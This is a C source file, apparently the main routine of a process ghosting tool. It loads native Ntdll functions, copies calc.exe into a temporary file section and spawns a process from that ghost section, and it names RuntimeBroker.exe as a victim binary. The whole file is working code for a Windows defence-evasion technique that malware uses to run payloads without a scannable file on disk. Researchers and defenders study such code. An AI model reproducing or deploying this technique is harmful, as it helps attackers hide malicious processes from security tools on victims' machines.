#include "ProcessGhosting.h"

#define		TARGET_PE			L"C:\\Windows\\system32\\calc.exe"
#define		VICTIM_PE			L"C:\\Windows\\system32\\RuntimeBroker.exe"

int main()
{

	Win32		ProcessGhostingApi			= { 0 };

	PVOID		FileBuffer					= NULL;
	SIZE_T		FileBufferSize				= 0;

	HANDLE		GhostSectionHandle			= NULL;
	WCHAR		NtTmpPath[MAX_PATH * 2]		= { 0 };

	WCHAR		TmpFile[MAX_PATH]		= { 0 };
	WCHAR		TempPath[MAX_PATH]			= { 0 };
	WCHAR		TempFilePath[MAX_PATH * 2] = { 0 };

	ProcessGhostingApi.Module.Ntdll = GetModuleHandleW(L"Ntdll.dll");

	ProcessGhostingApi.Ntapi.NtAllocateVirtualMemory				 = (fnNtAllocateVirtualMemory)GetProcAddress(ProcessGhostingApi.Module.Ntdll, "NtAllocateVirtualMemory");
	ProcessGhostingApi.Ntapi.NtCreateProcessEx						 = (pNtCreateProcessEx)GetProcAddress(ProcessGhostingApi.Module.Ntdll, "NtCreateProcessEx");
	ProcessGhostingApi.Ntapi.NtCreateSection						 = (pNtCreateSection)GetProcAddress(ProcessGhostingApi.Module.Ntdll, "NtCreateSection");
	ProcessGhostingApi.Ntapi.NtCreateThreadEx						 = (pNtCreateThreadEx)GetProcAddress(ProcessGhostingApi.Module.Ntdll, "NtCreateThreadEx");
	ProcessGhostingApi.Ntapi.NtOpenFile								 = (pNtOpenFile)GetProcAddress(ProcessGhostingApi.Module.Ntdll, "NtOpenFile");
	ProcessGhostingApi.Ntapi.NtQueryInformationProcess				 = (pNtQueryInformationProcess)GetProcAddress(ProcessGhostingApi.Module.Ntdll, "NtQueryInformationProcess");
	ProcessGhostingApi.Ntapi.NtReadVirtualMemory					 = (fnNtReadVirtualMemory)GetProcAddress(ProcessGhostingApi.Module.Ntdll, "NtReadVirtualMemory");
	ProcessGhostingApi.Ntapi.NtSetInformationFile					 = (pNtSetInformationFile)GetProcAddress(ProcessGhostingApi.Module.Ntdll, "NtSetInformationFile");
	ProcessGhostingApi.Ntapi.NtWriteFile							 = (pNtWriteFile)GetProcAddress(ProcessGhostingApi.Module.Ntdll, "NtWriteFile");
	ProcessGhostingApi.Ntapi.NtWriteVirtualMemory					 = (fnNtWriteVirtualMemory)GetProcAddress(ProcessGhostingApi.Module.Ntdll, "NtWriteVirtualMemory");
	ProcessGhostingApi.Ntapi.RtlCreateProcessParametersEx			 = (fnRtlCreateProcessParametersEx)GetProcAddress(ProcessGhostingApi.Module.Ntdll, "RtlCreateProcessParametersEx");
	ProcessGhostingApi.Ntapi.RtlDosPathNameToNtPathName_U_WithStatus = (fnRtlDosPathNameToNtPathName_U_WithStatus)GetProcAddress(ProcessGhostingApi.Module.Ntdll, "RtlDosPathNameToNtPathName_U_WithStatus");

	if (GetTempPathW(MAX_PATH, TempPath) == 0) {
		PRINT_ERROR("GetTempPathW");
		return -1;
	}

	if (GetTempFileNameW(TempPath, L"TH", 0, TmpFile) == 0) {
		PRINT_ERROR("GetTempFileNameW");
		return -1;
	}

	wsprintfW((LPWSTR)TempFilePath, L"\\??\\%s", TmpFile);

	INFO("Temp Path: %ls", TempFilePath);

	if (!ReadTargetFileW(TARGET_PE, &FileBufferSize, &FileBuffer))
	{
		PRINT_ERROR("ReadTargetFileW");
		return 1;
	}

	INFO("Buffer Size: %zu", FileBufferSize);

	if (!CreateFileSection(&ProcessGhostingApi, TempFilePath, FileBuffer, FileBufferSize, &GhostSectionHandle))
	{
		PRINT_ERROR("CreateFileSection");
		return 1;
	}

	INFO("[0x%p] Ghost Section Handle", GhostSectionHandle);

	if (!CreateGhostedProcess(TARGET_PE, GhostSectionHandle, FileBuffer, &ProcessGhostingApi))
	{
		PRINT_ERROR("CreateGhostedProcess");
		return 1;
	}

	OKAY("Success!");

	CHAR("Quit...");
	getchar();

	return 0;

}